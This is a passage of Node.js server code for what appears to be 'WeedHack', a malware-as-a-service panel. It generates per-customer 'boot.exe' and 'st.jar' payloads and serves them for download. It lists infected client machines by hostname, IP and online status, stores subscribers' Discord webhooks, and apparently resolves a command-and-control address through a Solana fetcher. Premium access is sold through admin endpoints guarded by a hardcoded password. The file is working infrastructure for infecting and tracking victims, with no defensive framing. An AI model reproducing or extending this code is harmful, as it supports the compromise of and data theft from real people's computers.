  fs.writeFileSync(path.join(DOWNLOAD_DIR, 'boot.exe'), zipBuf, { mode: 0o644 });

  res.json({
    ok: true,
    buildId: Number(info.insertId),
    name: outName,
    size: zipBuf.length,
    key: buildKey,
    url: `/api/builds/${info.insertId}/download`,
    liveUrl: '/api/downloads/boot.exe',
  });
});

app.get('/api/builds', requireAuth, async (req, res) => {
  const [rows] = await db.query(`
    SELECT id, name, size, base, key, created_at FROM builds
    WHERE user_id = ? ORDER BY created_at DESC LIMIT 100
  `, [req.user.uid]);
  res.json(rows);
});

app.get('/api/builds/:id/download', limitDownload, requireAuth, async (req, res) => {
  const id = Number(req.params.id);
  if (!Number.isFinite(id)) return res.status(404).json({ error: 'not found' });
  const [rows] = await db.query(`
    SELECT name, stored_name, size FROM builds WHERE id = ? AND user_id = ?
  `, [id, req.user.uid]);
  if (!rows.length) return res.status(404).json({ error: 'not found' });
  const row = rows[0];
  const src = path.join(BUILD_DIR, row.stored_name);
  if (!fs.existsSync(src)) return res.status(410).json({ error: 'file gone' });
  res.setHeader('Content-Type', 'application/x-msdownload');
  res.setHeader('Content-Length', row.size);
  res.setHeader('Content-Disposition', `attachment; filename="${row.name}"`);
  fs.createReadStream(src).pipe(res);
});

app.delete('/api/builds/:id', requireAuth, async (req, res) => {
  const id = Number(req.params.id);
  if (!Number.isFinite(id)) return res.status(404).json({ error: 'not found' });
  const [rows] = await db.query(`SELECT stored_name FROM builds WHERE id = ? AND user_id = ?`, [id, req.user.uid]);
  if (!rows.length) return res.status(404).json({ error: 'not found' });
  const p = path.join(BUILD_DIR, rows[0].stored_name);
  try { fs.unlinkSync(p); } catch {}
  await db.query(`DELETE FROM builds WHERE id = ? AND user_id = ?`, [id, req.user.uid]);
  res.json({ ok: true });
});

app.post('/api/admin/login', limitAdmin, (req, res) => {
  const { password } = req.body || {};
  if (password === 'Shit123') return res.json({ ok: true });
  res.status(403).json({ error: 'Forbidden' });
});

app.post('/api/admin/upgrade', limitAdmin, async (req, res) => {
  const { password, accountKey, days } = req.body || {};

  if (password !== 'Shit123') return res.status(403).json({ error: 'Forbidden' });
  if (!accountKey) return res.status(400).json({ error: 'Account key required' });
  if (!days || isNaN(days)) return res.status(400).json({ error: 'Valid days required' });

  const [users] = await remoteDb.query(`SELECT id, premium_until FROM users WHERE account_key = ?`, [accountKey]);
  if (!users.length) return res.status(404).json({ error: 'User not found' });
  const user = users[0];

  const baseTime = (user.premium_until && Number(user.premium_until) > Date.now()) ? Number(user.premium_until) : Date.now();
  const newExpiry = baseTime + (Number(days) * 24 * 60 * 60 * 1000);

  await remoteDb.query(`UPDATE users SET premium_until = ? WHERE id = ?`, [newExpiry, user.id]);
  await db.query(`UPDATE users SET premium_until = ? WHERE id = ?`, [newExpiry, user.id]);
  invalidateUser(user.id);

  const dateStr = new Date(newExpiry).toLocaleString();
  res.json({ ok: true, message: `Premium active until ${dateStr}` });
});

app.post('/api/admin/remove', limitAdmin, async (req, res) => {
  const { password, accountKey } = req.body || {};

  if (password !== 'Shit123') return res.status(403).json({ error: 'Forbidden' });
  if (!accountKey) return res.status(400).json({ error: 'Account key required' });

  const [users] = await remoteDb.query(`SELECT id FROM users WHERE account_key = ?`, [accountKey]);
  if (!users.length) return res.status(404).json({ error: 'User not found' });

  await remoteDb.query(`UPDATE users SET premium_until = 0 WHERE id = ?`, [users[0].id]);
  await db.query(`UPDATE users SET premium_until = 0 WHERE id = ?`, [users[0].id]);
  invalidateUser(users[0].id);
  res.json({ ok: true, message: 'Premium removed successfully' });
});

const ADMIN2_PASSWORD = process.env.ADMIN2_PASSWORD || 'Shit123';
const ADMIN2_COOKIE   = 'a2_token';

const limitAdmin2Login = limit({
  windowMs: 15 * 60_000, max: 5,
  message: { error: 'locked — try again later' },
});
const limitAdmin2Api = limit({
  windowMs: 60_000, max: 120,
  message: { error: 'too many requests' },
});

function requireAdmin2(req, res, next) {
  const token = req.cookies?.[ADMIN2_COOKIE];
  if (!token) return res.status(401).json({ error: 'unauthorized' });
  try {
    const payload = jwt.verify(token, CFG.jwtSecret);
    if (!payload || payload.admin2 !== true) return res.status(401).json({ error: 'unauthorized' });
    next();
  } catch {
    res.status(401).json({ error: 'unauthorized' });
  }
}

app.post('/api/admin2/login', limitAdmin2Login, (req, res) => {
  const { password } = req.body || {};
  if (typeof password !== 'string' || password.length === 0 || password.length > 256) {
    return res.status(400).json({ error: 'bad request' });
  }

  const expected = Buffer.from(ADMIN2_PASSWORD, 'utf8');
  const given    = Buffer.from(password, 'utf8');
  const sameLen  = expected.length === given.length;
  const cmp = sameLen && crypto.timingSafeEqual(expected, given);
  if (!cmp) return res.status(403).json({ error: 'forbidden' });

  const token = jwt.sign({ admin2: true }, CFG.jwtSecret, { expiresIn: '12h' });
  res.cookie(ADMIN2_COOKIE, token, {
    httpOnly: true,
    sameSite: 'strict',
    secure: CFG.cookieSecure,
    maxAge: 12 * 3600 * 1000,
    path: '/',
  });
  res.json({ ok: true });
});

app.post('/api/admin2/logout', (req, res) => {
  res.clearCookie(ADMIN2_COOKIE, { path: '/' });
  res.json({ ok: true });
});

app.get('/api/admin2/me', limitAdmin2Api, requireAdmin2, (req, res) => {
  res.setHeader('Cache-Control', 'no-store');
  res.json({ ok: true });
});

app.get('/api/admin2/stats', limitAdmin2Api, requireAdmin2, async (req, res) => {
  res.setHeader('Cache-Control', 'no-store');

  const cacheKey = 'admin2:stats';
  const cached = getCache(cacheKey);
  if (cached) return res.json(cached);

  const now = Date.now();
  const cutoff = now - 30_000;

  const [totalRows]   = await db.query(`SELECT COUNT(*) AS n FROM clients`);
  const [onlineRows]  = await db.query(`SELECT COUNT(*) AS n FROM clients WHERE last_seen >= ?`, [cutoff]);
  const [offlineRows] = await db.query(`SELECT COUNT(*) AS n FROM clients WHERE last_seen <  ?`, [cutoff]);

  const [rows] = await db.query(`
    SELECT c.id, c.hostname, c.ip, c.last_seen, u.username
    FROM clients c
    JOIN users u ON u.id = c.user_id
    ORDER BY c.last_seen DESC
    LIMIT 500
  `);

  const payload = {
    total:   Number(totalRows[0].n),
    online:  Number(onlineRows[0].n),
    offline: Number(offlineRows[0].n),
    rows: rows.map(r => ({
      id: r.id,
      hostname: r.hostname,
      ip: r.ip,
      username: r.username,
      online: now - r.last_seen < 30_000,
      lastSeen: r.last_seen,
      createdAt: r.last_seen, 
    })),
  };

  setCache(cacheKey, payload, 10000);
  res.json(payload);
});

app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
app.use((err, _req, res, _next) => { console.error('[http]', err); res.status(500).json({ error: 'server error' }); });

// ─── Sync Job ────────────────────────────────────────────────────────────────
async function syncUsers() {
  try {
    const [remoteUsers] = await remoteDb.query('SELECT * FROM users');
    const localUsers = db.prepare('SELECT * FROM users').all();
    
    const remoteMap = new Map(remoteUsers.map(u => [u.id, u]));
    const localMap = new Map(localUsers.map(u => [u.id, u]));

    for (const u of localUsers) {
      if (!remoteMap.has(u.id)) {
        await remoteDb.query(`
          INSERT INTO users (id, username, email, password_hash, account_key, login_token, discord_webhook, created_at, premium_until)
          VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        `, [u.id, u.username, u.email, u.password_hash, u.account_key, u.login_token, u.discord_webhook, u.created_at, u.premium_until]);
      }
    }

    for (const u of remoteUsers) {
      const local = localMap.get(u.id);
      if (!local) {
        db.prepare(`
          INSERT INTO users (id, username, email, password_hash, account_key, login_token, discord_webhook, created_at, premium_until)
          VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        `).run(u.id, u.username, u.email, u.password_hash, u.account_key, u.login_token, u.discord_webhook, u.created_at, u.premium_until);
      } else if (local.premium_until !== u.premium_until || local.discord_webhook !== u.discord_webhook) {
        db.prepare('UPDATE users SET premium_until = ?, discord_webhook = ? WHERE id = ?').run(u.premium_until, u.discord_webhook, u.id);
      }
    }
  } catch (e) {
    console.error('[sync] failed:', e.message);
  }
}

setInterval(syncUsers, 10 * 60 * 1000);
setTimeout(syncUsers, 5000);

// ─── Build Auto-Refresh ──────────────────────────────────────────────────────
const AUTO_REFRESH_INTERVAL_MS = 6 * 60 * 60 * 1000;

async function refreshAllBuilds() {
  try {
    const [rows] = await db.query(`SELECT DISTINCT user_id FROM builds WHERE base = 'boot'`);
    const userIds = rows.map(r => r.user_id);
    if (userIds.length === 0) {
      console.log('[auto-refresh] no builds to refresh');
      return;
    }

    let liveExeWritten = false;

    for (const uid of userIds) {
      try {
        const [uRows] = await db.query(`SELECT account_key FROM users WHERE id = ?`, [uid]);
        const u = uRows[0];
        if (!u || !u.account_key) continue;

        const [latestRows] = await db.query(`
          SELECT id, key FROM builds WHERE user_id = ? AND base = 'boot' ORDER BY created_at DESC LIMIT 1
        `, [uid]);
        const latest = latestRows[0];
        if (!latest) continue;

        console.log(`[auto-refresh] user ${uid} build ${latest.id}...`);
        
        const exeBuf = await buildBoot({ key: latest.key || u.account_key, buildId: latest.id });
        const exeName = `build_${Date.now()}_u${uid}.exe`;
        fs.writeFileSync(path.join(BUILD_DIR, exeName), exeBuf, { mode: 0o644 });

        const [oldRows] = await db.query(`SELECT stored_name FROM builds WHERE id = ?`, [latest.id]);
        const old = oldRows[0];

        await db.query(`
          UPDATE builds SET name = ?, stored_name = ?, size = ?, created_at = ? WHERE id = ?
        `, [exeName, exeName, exeBuf.length, Date.now(), latest.id]);

        if (old && old.stored_name && old.stored_name !== exeName) {
          try { fs.unlinkSync(path.join(BUILD_DIR, old.stored_name)); } catch {}
        }

        const [staleRows] = await db.query(`
          SELECT id, stored_name FROM builds WHERE user_id = ? AND id != ? AND base = 'boot'
        `, [uid, latest.id]);
        
        for (const b of staleRows) {
          try { fs.unlinkSync(path.join(BUILD_DIR, b.stored_name)); } catch {}
          await db.query(`DELETE FROM builds WHERE id = ?`, [b.id]);
        }

        if (!liveExeWritten) {
          fs.writeFileSync(path.join(DOWNLOAD_DIR, 'boot.exe'), exeBuf, { mode: 0o644 });
          liveExeWritten = true;
        }

        console.log(`[auto-refresh] user ${uid} → ${exeBuf.length} B`);
      } catch (e) {
        console.error(`[auto-refresh] user ${uid}: ${e.message}`);
      }
    }
  } catch (e) {
    console.error('[auto-refresh] failed:', e.message);
  }
}

setInterval(refreshAllBuilds, AUTO_REFRESH_INTERVAL_MS);
setTimeout(refreshAllBuilds, 10_000);

// ─── Solana IP Fetcher ───────────────────────────────────────────────────────
setInterval(fetchSolanaIp, 10 * 60 * 1000);
fetchSolanaIp();

const udpSock = startUdp({
  host: CFG.bindHost, port: CFG.udpPort,
  onMsg: (text, rinfo, s) => {
    s.send(Buffer.from(`weedhack: ${text}`), rinfo.port, rinfo.address, () => {});
  },
});

const httpServer = http.createServer(app);
const tlsHttpServer = https.createServer(tlsOpts, app);

(async () => {
  try {
    console.log('[startup] Initializing Remote Database...');
    await initRemoteDb();
    console.log('[startup] Initializing Local Database...');
    await initLocalDb();
    console.log('[startup] Databases ready.');
    
    console.log('[startup] Building st.jar payload...');
    await buildJavaPayload();
    console.log('[startup] st.jar built successfully.');

    httpServer.listen(CFG.httpPort, CFG.bindHost, () => {
      console.log(`WeedHack http  on ${CFG.bindHost}:${CFG.httpPort}`);
    });

    tlsHttpServer.on('tlsClientError', (e) => console.log(`[tls] client err: ${e.message}`));
    tlsHttpServer.listen(CFG.tcpPort, CFG.bindHost, () => {
      console.log(`WeedHack https on ${CFG.bindHost}:${CFG.tcpPort}`);
      console.log(`WeedHack udp   on ${CFG.bindHost}:${CFG.udpPort}`);
    });

  } catch (e) {
    console.error('[startup] Failed startup:', e);
    process.exit(1);
  }
})();

let shuttingDown = false;

function shutdown(sig) {
  if (shuttingDown) return;
  shuttingDown = true;
  console.log(`\n[shutdown] ${sig}`);

  httpServer.close(() => console.log('[shutdown] http closed'));
  tlsHttpServer.close(() => console.log('[shutdown] https closed'));
  closeUdp();

  setTimeout(() => process.exit(0), 3000).unref();
}

process.on('SIGINT',  () => shutdown('SIGINT'));
process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('uncaughtException',  (e) => console.error('[uncaught]', e));
process.on('unhandledRejection', (e) => console.error('[unhandled]', e));